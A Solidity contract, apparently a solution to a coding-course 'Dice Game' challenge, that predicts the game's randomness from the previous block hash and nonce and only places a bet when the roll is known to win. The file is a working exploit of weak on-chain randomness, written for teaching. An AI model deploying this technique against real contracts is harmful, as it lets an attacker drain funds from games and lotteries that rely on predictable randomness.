pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    receive() external payable { }

    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "The contract does not have enough eth. Please fund it first");
        uint256 nonce = diceGame.nonce();
        console.log('\t',"   Dice Game Rigged Roll Nonce:",nonce);

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;
        console.log('\t',"   Dice Game Rigged Roll:",roll);

        require(roll <= 2, "Roll will fail, try again");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "The contract doesnt have enough funds");

        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
    
}
